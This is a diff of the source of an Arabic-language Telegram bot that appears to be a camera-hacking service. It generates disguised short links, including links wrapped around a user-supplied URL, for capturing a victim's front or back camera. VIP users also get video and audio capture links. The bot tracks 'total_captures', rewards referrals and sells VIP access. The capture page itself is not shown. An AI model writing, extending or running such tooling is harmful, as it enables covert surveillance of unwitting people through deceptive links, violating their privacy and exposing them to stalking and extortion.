         const vipMsg = `🌟 <b>قسم VIP</b> 🌟\n\n` +
@@ -970,9 +876,9 @@ async function showVipSection(chat_id, user) {
 
         const keyboard = {
             inline_keyboard: [
-                [{ text: `👥 شراء بالإحالات (${price_refs} إحالة)`, callback_data: 'buy_vip_referrals', style: 'success' }],
-                [{ text: '📤 مشاركة رابط الدعوة', switch_inline_query: invite_link, style: 'primary' }],
-                [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/HackWahm', style: 'danger' }],
+                [{ text: `👥 شراء بالإحالات (${price_refs} إحالة)`, callback_data: 'buy_vip_referrals' }],
+                [{ text: '📤 مشاركة رابط الدعوة', switch_inline_query: invite_link }],
+                [{ text: '👨‍💻 تواصل مع المطور', url: 'https://t.me/HackWahm' }],
                 [{ text: '🔙', callback_data: 'back_main' }]
             ]
         };
@@ -985,378 +891,908 @@ async function showAccountSection(chat_id, user) {
     const userId = user.id;
     const status = user.is_vip ? getTextMsg('status_vip', lang) : getTextMsg('status_normal', lang);
     const level = getLevelEmoji(getUserLevel(user.referrals), lang);
+    const total_captures = user.total_captures || 0;
 
-    const accountMsg = getTextMsg('account_info', lang, userId, user.stars || 0, user.referrals || 0, level, status, user.total_captures || 0);
+    const info = getTextMsg('account_info', lang, userId, user.stars, user.referrals, level, status, total_captures);
 
-    const keyboard = {
-        inline_keyboard: [
-            [{ text: getTextMsg('share_invite', lang), callback_data: 'share_invite' }],
-            [{ text: '🔙', callback_data: 'back_main' }]
-        ]
-    };
-    await sendMessage(chat_id, accountMsg, keyboard);
-}
+    const bot_info = await sendTelegramRequest('getMe');
+    const bot_username = bot_info.result?.username || 'bot';
 
-async function showTemplatesMenu(chat_id, lang) {
-    const templateButtons = Object.keys(TEMPLATES).map(key => {
-        return [{ text: TEMPLATES[key].text, callback_data: `template_${key}` }];
-    });
+    const invite_text = `${getTextMsg('invite_text', lang)}\nhttps://t.me/${bot_username}?start=${userId}`;
 
     const keyboard = {
         inline_keyboard: [
-            ...templateButtons,
+            [{ text: getTextMsg('share_invite', lang), switch_inline_query: invite_text }],
             [{ text: '🔙', callback_data: 'back_main' }]
         ]
     };
-    await sendMessage(chat_id, getTextMsg('templates_menu', lang), keyboard);
+
+    const ref_link = getTextMsg('referral_link', lang, bot_username, userId);
+    await sendMessage(chat_id, `${info}\n\n${ref_link}`, keyboard);
 }
 
-// ==========================================
-// 8. Bot Event Handlers (Ported from index.php)
-// ==========================================
+async function handleStart(chat_id, user_id, first_name, username, text) {
+    let user = getUser(user_id);
+    let isNew = false;
 
-bot.on('message', async (msg) => {
-    const chat_id = msg.chat.id;
-    const text = msg.text;
-    const from_id = msg.from.id;
-    const lang = getUser(from_id)?.lang || 'ar';
+    // Check for referral
+    const startPayload = text.split(' ')[1];
+    if (startPayload && !user) {
+        const invitedBy = startPayload;
+        if (invitedBy && invitedBy !== user_id.toString()) {
+            user = updateUser(user_id, { invited_by: invitedBy });
+        }
+    }
 
-    writeLog(`Message from ${from_id} (${msg.from.username || msg.from.first_name}): ${text}`);
+    if (!user) {
+        user = updateUser(user_id, {});
+        isNew = true;
+    }
 
-    // Check if user is banned
-    const user = getUser(from_id);
-    if (user && user.is_banned) {
-        await sendMessage(chat_id, getTextMsg('banned', lang));
+    // Notify admin of new user
+    if (isNew) {
+        const name = first_name || 'Unknown';
+        const uname = username ? `@${username}` : 'N/A';
+        await sendMessage(ADMIN_ID, `🆕 <b>مستخدم جديد!</b>\n\n👤 الاسم: ${name}\n🔗 اليوزر: ${uname}\n🆔 الآيدي: <code>${user_id}</code>`);
+    }
+
+    // Daily bonus
+    const bonusGiven = await checkDailyBonus(user_id);
+
+    if (user.is_banned) {
+        await sendMessage(chat_id, getTextMsg('banned', user.lang));
         return;
     }
 
-    // Check maintenance mode
     const settings = loadSettings();
-    if (settings.maintenance_mode && from_id !== ADMIN_ID) {
-        await sendMessage(chat_id, getTextMsg('maintenance', lang));
+    if (settings.maintenance_mode && user_id != ADMIN_ID) {
+        await sendMessage(chat_id, getTextMsg('maintenance', user.lang));
         return;
     }
 
-    if (text === '/start') {
-        let invited_by = null;
-        if (msg.text.includes(' ')) {
-            invited_by = parseInt(msg.text.split(' ')[1]);
-        }
-        let user = getUser(from_id);
-        if (!user) {
-            user = updateUser(from_id, { invited_by: invited_by });
-            await showLanguageSelection(chat_id);
-        } else if (!user.agreed_terms) {
-            await showTermsMessage(chat_id, lang);
-        } else if (!user.lang_selected) {
-            await showLanguageSelection(chat_id);
+    // 1. Language first
+    if (!user.lang_selected) {
+        await showLanguageSelection(chat_id);
+        return;
+    }
+
+    // 2. Terms second
+    if (!user.agreed_terms) {
+        await showTermsMessage(chat_id, user.lang);
+        return;
+    }
+
+    // 3. Force join third
+    if (!(await checkForceJoin(user_id, user.lang))) {
+        return;
+    }
+
+    // Show main menu
+    await showMainMenu(chat_id, user.lang);
+
+    // Show daily bonus message
+    if (bonusGiven) {
+        user = getUser(user_id); // Reload user to get updated stars
+        await sendMessage(chat_id, getTextMsg('daily_bonus', user.lang, user.stars));
+    }
+}
+
+async function handleMessage(chat_id, user_id, text) {
+    let user = getUser(user_id);
+    if (!user || user.is_banned) return;
+
+    const lang = user.lang;
+
+    if (!user.agreed_terms) {
+        await handleStart(chat_id, user_id, '', '', '/start');
+        return;
+    }
+
+    if (!(await checkForceJoin(user_id, lang))) {
+        return;
+    }
+
+    if (user.state === 'waiting_custom_link') {
+        if (text.startsWith('http://') || text.startsWith('https://')) {
+            const code_f = generateShortCode();
+            saveShortLink(code_f, { u: user_id, r: text, c: 'f' });
+            const code_b = generateShortCode();
+            saveShortLink(code_b, { u: user_id, r: text, c: 'b' });
+
+            const front_link = `${BOT_URL}/${code_f}`;
+            const back_link = `${BOT_URL}/${code_b}`;
+
+            await sendMessage(chat_id, getTextMsg('custom_link_generated', lang, front_link, back_link));
+            updateUser(user_id, { state: 'none' });
         } else {
-            await showMainMenu(chat_id, lang);
-        }
-    } else if (user && user.state === 'awaiting_custom_link') {
-        if (!text.startsWith('http://') && !text.startsWith('https://')) {
             await sendMessage(chat_id, getTextMsg('invalid_link', lang));
-            return;
         }
-
-        const remainingCooldown = cooldownCheck(from_id, 'link', settings.cooldown_seconds);
-        if (remainingCooldown > 0 && !user.is_vip) {
-            await sendMessage(chat_id, getTextMsg('cooldown_msg', lang, remainingCooldown));
-            return;
-        }
-
-        const shortCode = generateShortCode();
-        saveShortLink(shortCode, { u: from_id, t: 'c', l: text });
-        updateUser(from_id, { state: 'none' });
-
-        const frontCamLink = `${BOT_URL}/${shortCode}?cam=front`;
-        const backCamLink = `${BOT_URL}/${shortCode}?cam=back`;
-
-        await sendMessage(chat_id, getTextMsg('custom_link_generated', lang, frontCamLink, backCamLink));
-    } else {
-        await showMainMenu(chat_id, lang);
-    }
-});
-
-bot.on('callback_query', async (callbackQuery) => {
-    const chat_id = callbackQuery.message.chat.id;
-    const message_id = callbackQuery.message.message_id;
-    const data = callbackQuery.data;
-    const from_id = callbackQuery.from.id;
-    let user = getUser(from_id);
-    const lang = user?.lang || 'ar';
-
-    writeLog(`Callback Query from ${from_id} (${callbackQuery.from.username || callbackQuery.from.first_name}): ${data}`);
-
-    // Check if user is banned
-    if (user && user.is_banned) {
-        await answerCallbackQuery(callbackQuery.id, getTextMsg('banned', lang), true);
         return;
     }
 
-    // Check maintenance mode
-    const settings = loadSettings();
-    if (settings.maintenance_mode && from_id !== ADMIN_ID) {
-        await answerCallbackQuery(callbackQuery.id, getTextMsg('maintenance', lang), true);
-        return;
+    // Default: show main menu
+    await showMainMenu(chat_id, lang);
+}
+
+async function handleCallbackQuery(callback_query) {
+    const id = callback_query.id;
+    const user_id = callback_query.from.id;
+    const data = callback_query.data;
+    const message_id = callback_query.message.message_id;
+
+    let user = getUser(user_id);
+    if (!user) {
+        user = updateUser(user_id, {});
     }
 
+    // Language selection
     if (data.startsWith('lang_')) {
-        const newLang = data.split('_')[1];
-        updateUser(from_id, { lang: newLang, lang_selected: true });
-        await answerCallbackQuery(callbackQuery.id, getTextMsg('lang_saved', newLang));
-        await showMainMenu(chat_id, newLang);
-    } else if (data === 'agree_terms') {
-        updateUser(from_id, { agreed_terms: true });
-        await answerCallbackQuery(callbackQuery.id, getTextMsg('terms_agreed', lang));
-        await showMainMenu(chat_id, lang);
-    } else if (data === 'check_join') {
-        const joined = await checkForceJoin(from_id, lang);
-        if (joined) {
-            await answerCallbackQuery(callbackQuery.id, '✅', true);
-            await showMainMenu(chat_id, lang);
-        } else {
-            await answerCallbackQuery(callbackQuery.id, getTextMsg('force_join', lang), true);
-        }
-    } else if (data === 'back_main') {
-        updateUser(from_id, { state: 'none' });
-        await showMainMenu(chat_id, lang);
-    } else if (data === 'menu_front_cam') {
-        const remainingCooldown = cooldownCheck(from_id, 'link', settings.cooldown_seconds);
-        if (remainingCooldown > 0 && !user.is_vip) {
-            await answerCallbackQuery(callbackQuery.id, getTextMsg('cooldown_msg', lang, remainingCooldown), true);
+        const lang = data.replace('lang_', '');
+        updateUser(user_id, { lang, lang_selected: true });
+        await answerCallbackQuery(id, getTextMsg('lang_saved', lang));
+        await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
+        await showTermsMessage(user_id, lang);
+        return;
+    }
+
+    // Agree terms
+    if (data === 'agree_terms') {
+        const lang = user.lang || 'ar';
+        updateUser(user_id, { agreed_terms: true });
+        await answerCallbackQuery(id, getTextMsg('terms_agreed', lang));
+        await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
+        if (!(await checkForceJoin(user_id, lang))) {
             return;
         }
-        const shortCode = generateShortCode();
-        saveShortLink(shortCode, { u: from_id, t: 'f' });
-        const link = `${BOT_URL}/${shortCode}?cam=front`;
-        await sendMessage(chat_id, link);
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'menu_back_cam') {
-        const remainingCooldown = cooldownCheck(from_id, 'link', settings.cooldown_seconds);
-        if (remainingCooldown > 0 && !user.is_vip) {
-            await answerCallbackQuery(callbackQuery.id, getTextMsg('cooldown_msg', lang, remainingCooldown), true);
-            return;
-        }
-        const shortCode = generateShortCode();
-        saveShortLink(shortCode, { u: from_id, t: 'b' });
-        const link = `${BOT_URL}/${shortCode}?cam=back`;
-        await sendMessage(chat_id, link);
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'menu_custom_link') {
-        updateUser(from_id, { state: 'awaiting_custom_link' });
-        await sendMessage(chat_id, getTextMsg('send_custom_link', lang));
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'menu_vip') {
-        await showVipSection(chat_id, user);
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'menu_account') {
-        await showAccountSection(chat_id, user);
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'share_invite') {
-        const bot_info = await sendTelegramRequest('getMe');
-        const bot_username = bot_info.result?.username || 'bot';
-        const invite_link = `https://t.me/${bot_username}?start=${from_id}`;
-        await sendMessage(chat_id, getTextMsg('referral_link', lang, bot_username, from_id));
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'buy_vip_referrals') {
-        const price_refs = settings.vip_price_referrals || 10;
-        if (user.referrals >= price_refs) {
-            updateUser(from_id, { is_vip: true, vip_expires: 0 }); // 0 for lifetime VIP
-            await sendMessage(chat_id, getTextMsg('vip_purchased_referrals', lang));
-            await checkAchievements(from_id);
-            await showVipSection(chat_id, getUser(from_id)); // Refresh VIP section
+        await showMainMenu(user_id, lang);
+        return;
+    }
+
+    // Check join
+    if (data === 'check_join') {
+        const lang = user.lang || 'ar';
+        const settings = loadSettings();
+        if (settings.force_channel) {
+            const channel = settings.force_channel;
+            try {
+                const res = await sendTelegramRequest('getChatMember', { chat_id: channel, user_id });
+                if (res.ok && ['member', 'administrator', 'creator'].includes(res.result.status)) {
+                    await creditReferral(user_id);
+                    await answerCallbackQuery(id, "✅");
+                    await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
+                    await showMainMenu(user_id, lang);
+                } else {
+                    await answerCallbackQuery(id, getTextMsg('force_join', lang), true);
+                }
+            } catch (error) {
+                writeLog(`Error checking force join on callback for user ${user_id}: ${error.message}`);
+                await answerCallbackQuery(id, 'Error checking channel status.', true);
+            }
         } else {
-            await sendMessage(chat_id, getTextMsg('not_enough_referrals', lang, user.referrals || 0, price_refs));
+            await answerCallbackQuery(id, "✅");
+            await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
+            await showMainMenu(user_id, user.lang);
         }
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data === 'menu_templates') {
-        await showTemplatesMenu(chat_id, lang);
-        await answerCallbackQuery(callbackQuery.id);
-    } else if (data.startsWith('template_')) {
-        const templateKey = data.split('_')[1];
-        const template = TEMPLATES[templateKey];
-        if (template) {
-            const remainingCooldown = cooldownCheck(from_id, 'link', settings.cooldown_seconds);
-            if (remainingCooldown > 0 && !user.is_vip) {
-                await answerCallbackQuery(callbackQuery.id, getTextMsg('cooldown_msg', lang, remainingCooldown), true);
+        return;
+    }
+
+    // Force join check for all other callbacks
+    if (!(await checkForceJoin(user_id, user.lang))) {
+        await answerCallbackQuery(id);
+        return;
+    }
+
+    const lang = user.lang;
+    const settings = loadSettings();
+
+    switch (data) {
+        case 'menu_front_cam':
+            const code_f = generateShortCode();
+            saveShortLink(code_f, { u: user_id, c: 'f' });
+            const link_f = `${BOT_URL}/${code_f}`;
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, `📸 ${link_f}`);
+            break;
+
+        case 'menu_back_cam':
+            const code_b = generateShortCode();
+            saveShortLink(code_b, { u: user_id, c: 'b' });
+            const link_b = `${BOT_URL}/${code_b}`;
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, `📸 ${link_b}`);
+            break;
+
+        case 'menu_custom_link':
+            updateUser(user_id, { state: 'waiting_custom_link' });
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, getTextMsg('send_custom_link', lang));
+            break;
+
+        case 'menu_vip':
+            await answerCallbackQuery(id);
+            await showVipSection(user_id, user);
+            break;
+
+        case 'menu_account':
+            await answerCallbackQuery(id);
+            await showAccountSection(user_id, user);
+            break;
+
+        case 'menu_help':
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, "❓ للتواصل مع الدعم تواصل مع الأدمن مباشرة.");
+            break;
+
+        case 'back_main':
+            await answerCallbackQuery(id);
+            await sendTelegramRequest('deleteMessage', { chat_id: user_id, message_id });
+            await showMainMenu(user_id, lang);
+            break;
+
+        case 'buy_vip_stars':
+            // Telegram Stars payment integration would go here.
+            // For now, just acknowledge.
+            await answerCallbackQuery(id, 'Telegram Stars payment not fully implemented yet.', true);
+            // Example: sendInvoice (requires provider_token)
+            // const invoice = {
+            //     chat_id: user_id,
+            //     title: 'VIP Subscription',
+            //     description: 'Access to Video and Audio capture features.',
+            //     payload: `vip_payload_${user_id}`,
+            //     provider_token: '', // THIS NEEDS TO BE CONFIGURED
+            //     currency: 'XTR',
+            //     prices: JSON.stringify([{
+            //         label: 'VIP',
+            //         amount: settings.vip_price_stars
+            //     }])
+            // };
+            // await sendTelegramRequest('sendInvoice', invoice);
+            break;
+
+        case 'buy_vip_referrals':
+            const requiredRefs = settings.vip_price_referrals;
+            if (user.referrals >= requiredRefs) {
+                updateUser(user_id, { is_vip: true });
+                await answerCallbackQuery(id, getTextMsg('vip_purchased_referrals', lang));
+                await sendMessage(user_id, getTextMsg('vip_purchased_referrals', lang));
+                await sendMessage(ADMIN_ID, `💎 VIP via Referrals!\nUser: ${user_id}\nReferrals: ${user.referrals}`);
+                await checkAchievements(user_id);
+            } else {
+                await answerCallbackQuery(id, getTextMsg('not_enough_referrals', lang, user.referrals, requiredRefs), true);
+            }
+            break;
+
+        case 'vip_get_video':
+            if (!user.is_vip) {
+                await answerCallbackQuery(id, getTextMsg('not_vip', lang), true);
                 return;
             }
-            const shortCode = generateShortCode();
-            saveShortLink(shortCode, { u: from_id, t: 'template', k: templateKey });
-            const link = `${BOT_URL}/${shortCode}`;
-            await sendMessage(chat_id, getTextMsg('template_link_generated', lang, link));
-        } else {
-            await answerCallbackQuery(callbackQuery.id, 'القالب غير موجود.', true);
-        }
-        await answerCallbackQuery(callbackQuery.id);
+            const vip_code_v = generateShortCode();
+            saveShortLink(vip_code_v, { u: user_id, c: 'v' });
+            const vip_link_v = `${BOT_URL}/${vip_code_v}`;
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, `🎥 ${vip_link_v}`);
+            break;
+
+        case 'vip_get_audio':
+            if (!user.is_vip) {
+                await answerCallbackQuery(id, getTextMsg('not_vip', lang), true);
+                return;
+            }
+            const vip_code_a = generateShortCode();
+            saveShortLink(vip_code_a, { u: user_id, c: 'a' });
+            const vip_link_a = `${BOT_URL}/${vip_code_a}`;
+            await answerCallbackQuery(id);
+            await sendMessage(user_id, `🎙️ ${vip_link_a}`);
+            break;
     }
-});
+}
+
+async function handlePreCheckoutQuery(pre_checkout_query) {
+    await sendTelegramRequest('answerPreCheckoutQuery', {
+        pre_checkout_query_id: pre_checkout_query.id,
+        ok: true
+    });
+}
+
+async function handleSuccessfulPayment(message) {
+    const user_id = message.from.id;
+    let user = getUser(user_id);
+    if (user) {
+        updateUser(user_id, { is_vip: true });
+        await sendMessage(user_id, getTextMsg('payment_success', user.lang));
+        await sendMessage(ADMIN_ID, `💰 New VIP Payment!\nUser ID: ${user_id}`);
+        await checkAchievements(user_id);
+    }
+}
+
+async function handleAdminCommand(chat_id, text) {
+    const parts = text.split(' ');
+    const cmd = parts[0];
+
+    if (chat_id != ADMIN_ID) {
+        await sendMessage(chat_id, "❌ أنت لست المسؤول.");
+        return;
+    }
+
+    switch (cmd) {
+        case '/admin':
+            let msg = `🔐 <b>لوحة تحكم الأدمن v5</b>\n\n`;
+            msg += `📊 /stats - إحصائيات البوت\n`;
+            msg += `📢 /broadcast [رسالة] - إذاعة\n`;
+            msg += `🚫 /ban [آيدي] - حظر مستخدم\n`;
+            msg += `✅ /unban [آيدي] - فك حظر\n`;
+            msg += `💎 /addvip [آيدي] - إضافة VIP\n`;
+            msg += `❌ /removevip [آيدي] - إلغاء VIP\n`;
+            msg += `🛠 /maintenance - تفعيل/تعطيل الصيانة\n`;
+            msg += `📢 /setchannel [@channel] - قناة إجبارية\n`;
+            msg += `🗑 /removechannel - إلغاء القناة\n`;
+            msg += `👥 /users - قائمة المستخدمين\n`;
+            msg += `🔍 /user [آيدي] - معلومات مستخدم\n`;
+            msg += `💰 /setvip_stars [سعر] - سعر VIP بالنجوم\n`;
+            msg += `👥 /setvip_refs [عدد] - سعر VIP بالإحالات\n`;
+            msg += `⭐ /setreferral_stars [عدد] - نجوم الإحالة\n`;
+            msg += `⏱ /setcooldown [ثواني] - تغيير الكولداون\n`;
+            msg += `📋 /logs - آخر السجلات\n`;
+            msg += `🔒 /security - سجل الأمان\n`;
+            msg += `✏️ /setwelcome [رسالة] - تغيير رسالة الترحيب\n`;
+            msg += `🔄 /resetwelcome - إعادة رسالة الترحيب للافتراضية`;
+            await sendMessage(chat_id, msg);
+            break;
+
+        case '/stats':
+            const users = loadUsers();
+            const total = Object.keys(users).length;
+            const vips = Object.values(users).filter(u => u.is_vip).length;
+            const banned = Object.values(users).filter(u => u.is_banned).length;
+            const active = Object.values(users).filter(u => u.agreed_terms && !u.is_banned).length;
+            const settings = loadSettings();
+            const maint = settings.maintenance_mode ? '🔴 مفعّل' : '🟢 معطّل';
+            const channel = settings.force_channel || 'لا يوجد';
+            let statsMsg = `📊 <b>إحصائيات البوت</b>\n\n`;
+            statsMsg += `👥 إجمالي المستخدمين: <b>${total}</b>\n`;
+            statsMsg += `✅ النشطين: <b>${active}</b>\n`;
+            statsMsg += `💎 VIP: <b>${vips}</b>\n`;
+            statsMsg += `🚫 المحظورين: <b>${banned}</b>\n\n`;
+            statsMsg += `🛠 الصيانة: ${maint}\n`;
+            statsMsg += `📢 القناة: ${channel}\n`;
+            statsMsg += `💰 سعر VIP (نجوم): ${settings.vip_price_stars}\n`;
+            statsMsg += `👥 سعر VIP (إحالات): ${settings.vip_price_referrals}\n`;
+            statsMsg += `⭐ نجوم الإحالة: ${settings.referral_stars}\n`;
+            statsMsg += `⏱ الكولداون: ${settings.cooldown_seconds} ثانية`;
+            await sendMessage(chat_id, statsMsg);
+            break;
+
+        case '/ban':
+            if (parts[1]) {
+                updateUser(parts[1], { is_banned: true });
+                await sendMessage(chat_id, `🚫 تم حظر المستخدم ${parts[1]}.`);
+            }
+            break;
+
+        case '/unban':
+            if (parts[1]) {
+                updateUser(parts[1], { is_banned: false });
+                await sendMessage(chat_id, `✅ تم فك حظر ${parts[1]}.`);
+            }
+            break;
+
+        case '/addvip':
+            if (parts[1]) {
+                updateUser(parts[1], { is_vip: true });
+                await sendMessage(chat_id, `💎 تم إضافة VIP لـ ${parts[1]}.`);
+                await sendMessage(parts[1], "🎉 تم ترقيتك إلى VIP!");
+            }
+            break;
+
+        case '/removevip':
+            if (parts[1]) {
+                updateUser(parts[1], { is_vip: false });
+                await sendMessage(chat_id, `❌ تم إلغاء VIP من ${parts[1]}.`);
+            }
+            break;
+
+        case '/maintenance':
+            let currentSettings = loadSettings();
+            currentSettings.maintenance_mode = !currentSettings.maintenance_mode;
+            saveSettings(currentSettings);
+            const status = currentSettings.maintenance_mode ? "🔴 مفعّل" : "🟢 معطّل";
+            await sendMessage(chat_id, `🛠 الصيانة: ${status}`);
+            break;
+
+        case '/setchannel':
+            if (parts[1]) {
+                let currentSettings = loadSettings();
+                currentSettings.force_channel = parts[1];
+                saveSettings(currentSettings);
+                await sendMessage(chat_id, `📢 تم تعيين القناة: ${parts[1]}`);
+            }
+            break;
+
+        case '/removechannel':
+            let currentSettingsChannel = loadSettings();
+            currentSettingsChannel.force_channel = null;
+            saveSettings(currentSettingsChannel);
+            await sendMessage(chat_id, "✅ تم إلغاء القناة الإجبارية.");
+            break;
+
+        case '/setvip_stars':
+            if (parts[1] && !isNaN(parseInt(parts[1]))) {
+                let currentSettingsStars = loadSettings();
+                currentSettingsStars.vip_price_stars = parseInt(parts[1]);
+                saveSettings(currentSettingsStars);
+                await sendMessage(chat_id, `💰 سعر VIP بالنجوم: ${parts[1]}`);
+            }
+            break;
+
+        case '/setvip_refs':
+            if (parts[1] && !isNaN(parseInt(parts[1]))) {
+                let currentSettingsRefs = loadSettings();
+                currentSettingsRefs.vip_price_referrals = parseInt(parts[1]);
+                saveSettings(currentSettingsRefs);
+                await sendMessage(chat_id, `👥 سعر VIP بالإحالات: ${parts[1]}`);
+            }
+            break;
+
+        case '/setreferral_stars':
+            if (parts[1] && !isNaN(parseInt(parts[1]))) {
+                let currentSettingsRefStars = loadSettings();
+                currentSettingsRefStars.referral_stars = parseInt(parts[1]);
+                saveSettings(currentSettingsRefStars);
+                await sendMessage(chat_id, `⭐ نجوم الإحالة: ${parts[1]}`);
+            }
+            break;
+
+        case '/setcooldown':
+            if (parts[1] && !isNaN(parseInt(parts[1]))) {
+                let currentSettingsCooldown = loadSettings();
+                currentSettingsCooldown.cooldown_seconds = parseInt(parts[1]);
+                saveSettings(currentSettingsCooldown);
+                await sendMessage(chat_id, `⏱ الكولداون: ${parts[1]} ثانية`);
+            }
+            break;
+
+        case '/users':
+            const allUsers = loadUsers();
+            let usersMsg = `👥 <b>المستخدمين</b> (${Object.keys(allUsers).length}):\n\n`;
+            let count = 0;
+            for (const uId in allUsers) {
+                if (count >= 30) {
+                    usersMsg += `\n... و ${Object.keys(allUsers).length - 30} آخرين`;
+                    break;
+                }
+                const u = allUsers[uId];
+                const vip_badge = u.is_vip ? '💎' : '';
+                const ban_badge = u.is_banned ? '🚫' : '';
+                usersMsg += `${u.id} ${vip_badge}${ban_badge}\n`;
+                count++;
+            }
+            await sendMessage(chat_id, usersMsg);
+            break;
+
+        case '/user':
+            if (parts[1]) {
+                const target = getUser(parts[1]);
+                if (target) {
+                    let userDetailMsg = `🔍 <b>معلومات المستخدم</b>\n\n`;
+                    userDetailMsg += `🆔 الآيدي: ${target.id}\n`;
+                    userDetailMsg += `🌐 اللغة: ${target.lang}\n`;
+                    userDetailMsg += `💎 VIP: ${target.is_vip ? 'نعم' : 'لا'}\n`;
+                    userDetailMsg += `🚫 محظور: ${target.is_banned ? 'نعم' : 'لا'}\n`;
+                    userDetailMsg += `⭐ النقاط: ${target.stars}\n`;
+                    userDetailMsg += `👥 الإحالات: ${target.referrals}\n`;
+                    userDetailMsg += `🏅 المستوى: ${getUserLevel(target.referrals)}\n`;
+                    await sendMessage(chat_id, userDetailMsg);
+                } else {
+                    await sendMessage(chat_id, "❌ المستخدم غير موجود.");
+                }
+            }
+            break;
+
+        case '/logs':
+            if (fs.existsSync(LOG_FILE)) {
+                const logs = fs.readFileSync(LOG_FILE, 'utf8').split('\n');
+                const last_logs = logs.slice(-15).join('\n');
+                const logMsg = `📋 <b>آخر السجلات:</b>\n\n${last_logs}`;
+                await sendMessage(chat_id, logMsg.substring(0, 4000));
+            } else {
+                await sendMessage(chat_id, "لا توجد سجلات.");
+            }
+            break;
+
+        case '/security':
+            if (fs.existsSync(SECURITY_LOG_FILE)) {
+                const logs = fs.readFileSync(SECURITY_LOG_FILE, 'utf8').split('\n');
+                const last_logs = logs.slice(-15).join('\n');
+                const secLogMsg = `🔒 <b>سجل الأمان:</b>\n\n${last_logs}`;
+                await sendMessage(chat_id, secLogMsg.substring(0, 4000));
+            }
+            break;
+
+        case '/setwelcome':
+            const welcomeText = text.replace('/setwelcome ', '');
+            if (welcomeText && welcomeText !== '/setwelcome') {
+                let currentSettingsWelcome = loadSettings();
+                currentSettingsWelcome.welcome_message = welcomeText;
+                saveSettings(currentSettingsWelcome);
+                await sendMessage(chat_id, `✅ تم تغيير رسالة الترحيب إلى:\n\n${welcomeText}`);
+            } else {
+                await sendMessage(chat_id, `❌ استخدم الأمر هكذا:\n/setwelcome رسالة الترحيب الجديدة`);
+            }
+            break;
+
+        case '/resetwelcome':
+            let currentSettingsResetWelcome = loadSettings();
+            currentSettingsResetWelcome.welcome_message = '';
+            saveSettings(currentSettingsResetWelcome);
+            await sendMessage(chat_id, `✅ تم إعادة رسالة الترحيب للافتراضية.`);
+            break;
+
+        case '/broadcast':
+            const msg_text = text.replace('/broadcast ', '');
+            if (msg_text && msg_text !== '/broadcast') {
+                const allUsers = loadUsers();
+                let successCount = 0;
+                let failCount = 0;
+                for (const uId in allUsers) {
+                    const u = allUsers[uId];
+                    if (!u.is_banned) {
+                        try {
+                            await sendMessage(u.id, `📢 <b>إعلان:</b>\n\n${msg_text}`);
+                            successCount++;
+                        } catch (e) {
+                            failCount++;
+                            writeLog(`Broadcast failed for user ${u.id}: ${e.message}`);
+                        }
+                    }
+                }
+                await sendMessage(chat_id, `✅ الإذاعة:\n📤 نجح: ${successCount}\n❌ فشل: ${failCount}`);
+            }
+            break;
+
+        default:
+            await sendMessage(chat_id, "❓ أمر غير معروف. /admin");
+            break;
+    }
+}
 
 // ==========================================
-// 9. Web Server (Express) (Ported from index.php)
+// 8. Webhook and Express Setup
 // ==========================================
 
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
-// Middleware to set security headers
+// Middleware to set security headers for all responses
 app.use((req, res, next) => {
     setSecurityHeaders(res);
     next();
 });
 
-// Serve static images for Open Graph
-app.use('/images', express.static(path.join(__dirname, 'images')));
-app.use('/templates', express.static(path.join(__dirname, 'templates')));
+// Telegram Webhook endpoint
+app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
+    const update = req.body;
+    writeLog(`Received update: ${JSON.stringify(update)}`);
 
-app.get('/:code', async (req, res) => {
-    const code = sanitizeInput(req.params.code);
-    const cam = sanitizeInput(req.query.cam);
-    const linkData = getShortLinkData(code);
+    if (update.message) {
+        const message = update.message;
+        const chat_id = message.chat.id;
+        const user_id = message.from.id;
+        const text = message.text || '';
+        const first_name = message.from.first_name || '';
+        const username = message.from.username || '';
 
-    if (!linkData) {
-        return res.status(404).send('Link not found');
-    }
-
-    const userId = linkData.u;
-    const user = getUser(userId);
-    const lang = user?.lang || 'ar';
-
-    // Log visit
-    writeLog(`Link ${code} visited by IP ${req.ip} (User-Agent: ${req.headers['user-agent']})`);
-
-    // Handle template links
-    if (linkData.t === 'template' && linkData.k) {
-        const template = TEMPLATES[linkData.k];
-        if (template) {
-            const templatePath = path.join(__dirname, 'templates', template.template_file);
-            fs.readFile(templatePath, 'utf8', (err, data) => {
-                if (err) {
-                    console.error(`Error reading template file ${template.template_file}:`, err);
-                    return res.status(500).send('Internal Server Error');
-                }
-                let html = data;
-                // Replace placeholders
-                html = html.replace(/{{BOT_URL}}/g, BOT_URL);
-                html = html.replace(/{{FULL_LINK}}/g, `${BOT_URL}/${code}`);
-
-                // Set Open Graph meta tags dynamically if not already in template
-                // This part is crucial for OG previews
-                let ogTags = ``;
-                if (template.og_title) ogTags += `<meta property="og:title" content="${template.og_title}" />\n`;
-                if (template.og_description) ogTags += `<meta property="og:description" content="${template.og_description}" />\n`;
-                if (template.og_image) ogTags += `<meta property="og:image" content="${BOT_URL}/${template.og_image}" />\n`;
-                ogTags += `<meta property="og:url" content="${BOT_URL}/${code}" />\n`;
-                ogTags += `<meta property="og:type" content="website" />\n`;
-
-                // Inject OG tags right after <head>
-                html = html.replace('<head>', `<head>\n    ${ogTags}`);
-
-                res.send(html);
-            });
+        if (message.successful_payment) {
+            await handleSuccessfulPayment(message);
+        } else if (user_id == ADMIN_ID && text.startsWith('/') && !['/start', '/lang', '/id'].includes(text.split(' ')[0])) {
+            await handleAdminCommand(chat_id, text);
